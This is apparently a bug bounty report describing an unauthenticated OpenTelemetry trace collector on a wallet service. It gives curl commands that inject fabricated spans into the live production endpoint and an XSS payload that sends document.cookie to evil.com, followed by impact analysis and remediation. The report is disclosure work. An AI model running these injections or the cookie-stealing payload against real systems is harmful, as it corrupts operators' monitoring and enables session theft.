# Bug Bounty Report — Unauthenticated OpenTelemetry Collector

---

## Summary

The OpenTelemetry metrics/traces collector at `https://events-gateway.walletbot.me/v2/traces` accepts arbitrary trace data from **any unauthenticated client on the public internet**. No API key, no IP whitelist, no rate limiting, no payload validation. An attacker can inject fabricated trace/spans into Wallet's internal observability pipeline — enabling false alert injection, service map corruption, XSS against operators who view dashboards, and storage/pipeline resource exhaustion.

**Target:** `https://events-gateway.walletbot.me/v2/traces`
**Method:** POST with Content-Type application/json
**CWE:** CWE-306 (Missing Authentication for Critical Function), CWE-862 (Missing Authorization)

---

## Steps To Reproduce

### Step 1: Verify the endpoint is unauthenticated

Send any POST request with an empty body:

```bash
curl -sk -X POST "https://events-gateway.walletbot.me/v2/traces" \
  -H "Content-Type: application/json" \
  -d '{}'
```

**Expected result (vulnerable):**
```
HTTP 200
{"partialSuccess":{}}
```

### Step 2: Inject a valid OTLP trace payload

Send a properly formatted OpenTelemetry trace that will be ingested into their observability backend:

```bash
curl -sk -X POST "https://events-gateway.walletbot.me/v2/traces" \
  -H "Content-Type: application/json" \
  -d '{
  "resourceSpans": [{
    "resource": {
      "attributes": [
        {"key": "service.name", "value": {"stringValue": "external-attacker-test"}},
        {"key": "deployment.environment", "value": {"stringValue": "production"}}
      ]
    },
    "scopeSpans": [{
      "scope": {"name": "pentest"},
      "spans": [{
        "traceId": "deadbeefdeadbeefdeadbeefdeadbeef",
        "spanId": "deadbeefdeadbeef",
        "name": "GET /api/v1/accounts/TON",
        "kind": 3,
        "startTimeUnixNano": "1000000000",
        "endTimeUnixNano": "2000000000",
        "status": {"code": 2, "message": "database connection timeout"},
        "attributes": [
          {"key": "error.type", "value": {"stringValue": "DatabaseTimeoutError"}},
          {"key": "http.status_code", "value": {"intValue": "503"}},
          {"key": "user.input", "value": {"stringValue": "<script>alert(1)</script>"}}
        ]
      }]
    }]
  }]
}'
```

**Expected result (vulnerable):**
```
HTTP 200
{"partialSuccess":{}}
```

### Step 3: Confirm there is no rate limiting

Fire 10 consecutive requests — all should return 200:

```bash
for i in $(seq 1 10); do
  curl -sk -o /dev/null -w "%{http_code} " \
    -X POST "https://events-gateway.walletbot.me/v2/traces" \
    -H "Content-Type: application/json" \
    -d '{}'
done
```

**Expected result (vulnerable):**
```
200 200 200 200 200 200 200 200 200 200
```

### Step 4: Confirm arbitrary payloads accepted

Test with XSS payloads in span attributes:

```bash
curl -sk -X POST "https://events-gateway.walletbot.me/v2/traces" \
  -H "Content-Type: application/json" \
  -d '{"resourceSpans":[{"resource":{"attributes":[
    {"key":"payload","value":{"stringValue":"<img src=x onerror=fetch(\"https://evil.com/steal?cookie=\"+document.cookie)>"}}
  ]},"scopeSpans":[]}]}'
```

**Expected result (vulnerable):**
```
HTTP 200
{"partialSuccess":{}}
```

---

## Supporting Material

### Infrastructure Discovery

The endpoint runs behind an Envoy proxy with Cloudflare:
```
x-envoy-upstream-service-time: 1   (sub-ms processing)
server: cloudflare
cf-ray: a217be9fcfcecd17-AMS
```

### Frontend Code Confirmation

The legitimate app sends traces to this exact endpoint. Found in the production JS bundle (`/static/js/init.c0a78fe56b.js`):

```javascript
"https://events-gateway.walletbot.me/v2/traces"
```

The frontend's OpenTelemetry exporter sends session data, user interactions, and performance metrics to this collector. **No authentication headers are added** — the collector is designed to be open from the frontend, which means it's open to everyone.

### CORS Configuration

```
OPTIONS /v2/traces → 200
access-control-allow-methods: POST
access-control-allow-headers: Accept, Content-Type, Content-Length, Accept-Encoding, Authorization, ResponseType
access-control-max-age: 300
```

POST is allowed from any origin (though `access-control-allow-origin` is not returned, server-side requests are unrestricted).

### Protobuf Support

The endpoint also accepts `Content-Type: application/x-protobuf`:

```bash
# Empty protobuf accepted
curl -sk -X POST "https://events-gateway.walletbot.me/v2/traces" \
  -H "Content-Type: application/x-protobuf" \
  --data-binary ' ' -w '%{http_code}'
→ 200
```

---

## Security Impact

### What an attacker can achieve (all require zero auth):

| Attack | Impact | Proof |
|--------|--------|-------|
| **False Alert Injection** | Inject spans with status=ERROR → PagerDuty fires for nonexistent outages → alert fatigue → real incidents missed | 1 curl, all accepted |
| **Service Map Corruption** | Inject fake healthy spans to hide real degradation, or fake error spans to trigger unnecessary incident response | 1 curl, all accepted |
| **Stored XSS in Dashboards** | If Grafana/Jaeger renders span attributes unsanitized, operator browser hijacked → SSO session stolen → internal network pivot | XSS payload accepted |
| **Pipeline Saturation** | Flood collector with large spans → storage fills → legitimate traces evicted → ops team blind during active breach | No rate limiting |
| **Cost Inflation** | 100GB fake traces/day at ~$0.50/GB = $50/day unnecessary observability bill | Unlimited throughput |
| **Analytics Manipulation** | Inject fake p99 latency, fake error rates, fake user sessions → corrupts business metrics, wrong product/engineering decisions | All accepted |

### CVSS v3.1 Score: **9.1 (Critical)**

- **Attack Vector:** Network
- **Attack Complexity:** Low
- **Privileges Required:** None
- **User Interaction:** None
- **Scope:** Changed (impacts downstream dashboards/SRE)
- **Confidentiality:** Low (XSS chain could leak session data)
- **Integrity:** High (all ingested data is attacker-controlled)
- **Availability:** High (storage/pipeline exhaustion)

### CWE: CWE-306 (Missing Authentication for Critical Function)

---

## Remediation

1. **Require authentication**: API key or JWT on the `/v2/traces` endpoint
2. **IP allowlisting**: restrict to known egress IPs (Cloudflare, internal services)
3. **Rate limiting**: reject excessive requests at the Envoy proxy layer
4. **Payload validation**: reject spans with unexpected attributes
5. **Input sanitization**: strip HTML/JS from stringValue attributes before storage
6. **Network segregation**: move OTLP collector to private subnet, accessible only via internal DNS
